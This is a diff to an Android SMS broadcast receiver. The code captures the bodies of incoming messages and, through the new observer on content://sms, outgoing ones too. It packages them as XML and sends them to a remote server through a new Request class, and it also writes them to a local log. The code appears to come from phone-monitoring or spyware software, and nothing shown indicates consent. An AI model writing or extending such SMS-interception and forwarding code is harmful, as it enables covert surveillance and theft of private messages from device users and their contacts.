@@ -15,8 +15,8 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.inet.android.bs.DataSendHandler;
 import com.inet.android.bs.FileLog;
+import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
@@ -28,6 +28,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private Context mContext;
 	private Bundle mBundle;
 	String dir = null;
+	Request req;
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
@@ -68,7 +69,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			if (smsSentObserver == null) {
 				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
 				mContext.getContentResolver().registerContentObserver(
-						STATUS_URI, true, smsSentObserver);
+						Uri.parse("content://sms"), true, smsSentObserver);
 			}
 		} catch (Exception sgh) {
 			Log.e(TAG, "Error in Init : " + sgh.toString());
@@ -127,9 +128,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 							+ "</ttl><cdata1>" + msgs[k].getMessageBody()
 							+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
-					DataSendHandler dSH = new DataSendHandler(mContext);
-					dSH.send(2, sendStr);
-
+					req = new Request(mContext);
+					req.sendRequest(sendStr);
 					Log.d("smsRec", sendStr);
 					FileLog.writeLog("sms: " + sendStr);
 				}
